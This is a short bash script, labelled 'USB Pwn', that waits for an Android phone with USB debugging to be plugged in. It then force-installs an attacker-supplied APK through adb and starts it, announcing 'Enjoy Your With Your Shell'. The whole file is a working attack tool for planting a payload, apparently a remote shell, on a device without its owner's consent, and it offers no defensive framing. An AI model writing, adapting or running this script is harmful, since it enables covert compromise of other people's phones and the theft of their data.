#!/bin/bash
APK_PAYLOAD=$1
Main_Activity=$2

using () {
  echo "  USB Pwn by wazehell "
  echo "$0 <payload.apk> <Main_Activity>"
}
if [[ -z "$APK_PAYLOAD" ]] || [[ -z "$Main_Activity" ]]; then
    using
    exit 1
fi
if [ ! -f "$APK_PAYLOAD" ]; then
    echo "$1 File Not Found !"
fi
adbconnect (){
  echo "Trying to connect"
  connectstring=`adb start-server 2>/dev/null;sleep 3`
}

sendingpayload(){
  DEV_LIST=`adb devices | grep 'device$' | awk '{ print $1 }' 2>/dev/null`
  for DEV in "$DEV_LIST"; do
      echo "Sending Payload to $DEV "
      payload_install=`adb -s $DEV install -f $APK_PAYLOAD `
      if [ "$payload_install" ]; then
  	  	  echo "Payload $APK_PAYLOAD has been sent successfully to $DEV"
  	  fi
      startpayload=`adb -s $DEV shell am start --user 0 -a android.intent.action.MAIN -n $Main_Activity`
      if [ "$startpayload" ]; then
        echo "Activity Started ! Enjoy Your With Your Shell ! :) "
        exit 1
      fi
  done
}

while [[ True ]]; do
  CKCONNECT=`adb devices -l | grep -E "device(.*)product"`
  adbconnect
  if [[ "$CKCONNECT" ]]; then
    echo "Connected !"
    sendingpayload
    break;
  fi
done;
